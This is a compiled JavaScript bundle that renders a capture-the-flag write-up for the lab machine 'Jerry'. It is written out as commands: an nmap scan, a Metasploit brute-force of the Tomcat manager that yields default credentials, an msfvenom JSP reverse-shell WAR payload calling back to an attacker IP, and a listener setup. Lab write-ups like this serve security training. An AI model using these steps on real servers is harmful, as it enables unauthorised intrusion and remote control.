(window.webpackJsonp=window.webpackJsonp||[]).push([[80],{421:function(s,e,t){"use strict";t.r(e);var a=t(13),r=Object(a.a)({},(function(){var s=this,e=s._self._c;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("h1",{attrs:{id:"jerry"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#jerry"}},[s._v("#")]),s._v(" Jerry")]),s._v(" "),e("h2",{attrs:{id:"nmap-scan"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#nmap-scan"}},[s._v("#")]),s._v(" NMAP scan")]),s._v(" "),e("h3",{attrs:{id:"scan-command"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#scan-command"}},[s._v("#")]),s._v(" Scan command")]),s._v(" "),e("div",{staticClass:"language-sh extra-class"},[e("pre",{pre:!0,attrs:{class:"language-sh"}},[e("code",[s._v("nmap "),e("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-A")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-T5")]),s._v(" -p-  "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.10")]),s._v(".10.95\n")])])]),e("h3",{attrs:{id:"result"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#result"}},[s._v("#")]),s._v(" Result")]),s._v(" "),e("div",{staticClass:"language- extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("Starting Nmap 7.70 ( https://nmap.org ) at 2020-04-09 05:50 EDT\nNmap scan report for 10.10.10.95\nHost is up (0.20s latency).\nNot shown: 65534 filtered ports\nPORT     STATE SERVICE VERSION\n8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1\n|_http-favicon: Apache Tomcat\n|_http-server-header: Apache-Coyote/1.1\n|_http-title: Apache Tomcat/7.0.88\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 7 Professional (87%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%), Microsoft Windows Server 2016 (85%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\n\nTRACEROUTE (using port 8080/tcp)\nHOP RTT       ADDRESS\n1   199.09 ms 10.10.14.1\n2   199.91 ms 10.10.10.95\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 212.25 seconds\n")])])]),e("h2",{attrs:{id:"result-analysis"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#result-analysis"}},[s._v("#")]),s._v(" Result analysis")]),s._v(" "),e("p",[s._v("From the NMAP scan, we see that the port 8080 is open and is a tomcat server. So for our attack strategy, we can use the following:")]),s._v(" "),e("ol",[e("li",[s._v("Attack the tomcat server with any version exploits")]),s._v(" "),e("li",[s._v("Brute-force admin site password")])]),s._v(" "),e("h3",{attrs:{id:"checking-out-the-tomcat-server"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#checking-out-the-tomcat-server"}},[s._v("#")]),s._v(" Checking out the tomcat server")]),s._v(" "),e("p",[s._v("Upon first inspection after loading the tomcat manager into a browser, we see that it is still\nan unconfigured server. This presents a likely answer that the server is not even set up yet.")]),s._v(" "),e("h3",{attrs:{id:"metasploit"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#metasploit"}},[s._v("#")]),s._v(" Metasploit")]),s._v(" "),e("p",[s._v("Using metasploit to crack the credentials")]),s._v(" "),e("div",{staticClass:"language-sh extra-class"},[e("pre",{pre:!0,attrs:{class:"language-sh"}},[e("code",[s._v("use auxiliary/scanner/http/tomcat_mgr_login\n"),e("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" rhosts "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.10")]),s._v(".10.95\nexploit\n")])])]),e("p",[s._v("and the username and password is given as username: "),e("code",[s._v("tomcat")]),s._v(", password: "),e("code",[s._v("s3cret")])]),s._v(" "),e("h3",{attrs:{id:"exploitation"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#exploitation"}},[s._v("#")]),s._v(" Exploitation")]),s._v(" "),e("p",[s._v("After logging onto the webpage, we see that it is possible to get a reverse shell by a "),e("code",[s._v("war")]),s._v(" file.\nLet's create a payload from MSFVenom to make a reverse shell")]),s._v(" "),e("h3",{attrs:{id:"msfvenom"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#msfvenom"}},[s._v("#")]),s._v(" MSFVenom")]),s._v(" "),e("div",{staticClass:"language-sh extra-class"},[e("pre",{pre:!0,attrs:{class:"language-sh"}},[e("code",[s._v("msfvenom "),e("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" java/jsp_shell_reverse_tcp "),e("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LHOST")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.10")]),s._v(".14.14 "),e("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LPORT")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("8888")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-f")]),s._v(" war "),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" shell.war\n")])])]),e("p",[s._v("Now upload the war file to the tomcat server")]),s._v(" "),e("h3",{attrs:{id:"reverse-shell"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#reverse-shell"}},[s._v("#")]),s._v(" Reverse shell")]),s._v(" "),e("div",{staticClass:"language-sh extra-class"},[e("pre",{pre:!0,attrs:{class:"language-sh"}},[e("code",[s._v("msfconsole\nuse exploit/multi/handler\n"),e("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" payload java/jsp_shell_reverse_tcp\n"),e("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" lhost "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.10")]),s._v(".14.14\n"),e("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" lport "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("8888")]),s._v("\n")])])]),e("p",[s._v("and now nagivate to "),e("code",[s._v("10.10.10.95:8080/shell")]),s._v(" to run the shell payload.\nand this gives us what we want! A reverse shell.")]),s._v(" "),e("p",[s._v("Navigating to the desktop of administrator")]),s._v(" "),e("div",{staticClass:"language-sh extra-class"},[e("pre",{pre:!0,attrs:{class:"language-sh"}},[e("code",[e("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("type")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"2 for the price of 1.txt"')]),s._v("\n")])])]),e("p",[s._v("and both the flags appear")])])}),[],!1,null,null,null);e.default=r.exports}}]);